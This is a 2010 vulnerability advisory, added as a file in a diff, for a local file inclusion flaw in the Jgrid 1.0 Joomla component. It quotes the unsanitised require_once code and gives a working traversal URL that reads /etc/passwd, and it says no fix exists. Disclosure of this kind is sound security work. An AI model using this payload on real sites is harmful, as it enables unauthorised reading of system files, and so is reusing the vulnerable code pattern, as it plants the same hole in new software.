@@ -1,0 +1,67 @@
+Jgrid 1.0 Joomla Component Local File Inclusion Vulnerability
+
+ Name              Jgrid
+ Vendor            http://datagrids.clubsareus.org
+ Versions Affected 1.0
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-08-14
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+DATA GRID Component built on the popular EXTJS Framework.
+
+
+II. DESCRIPTION
+_______________
+
+A parameter is not properly sanitised before being  used
+by the require_once function.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Local File Inclusion
+ 
+
+A) Local File Inclusion
+_______________________
+
+The  controller  parameter in jgrid.php is not  sanitised
+before  being  used by the PHP function's require_once().
+This allows a guest to include local files. The following
+is the affected code:
+
+if($controller = JRequest::getVar('controller')) {
+	require_once (JPATH_COMPONENT.DS.'controllers'.DS.$controller.'.php');
+}
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Local File Inclusion
+
+http://site/path/index.php?option=com_jgrid&controller=../../../../../../../../etc/passwd%00
+
+
+V. FIX
+______
+
+No fix.
+
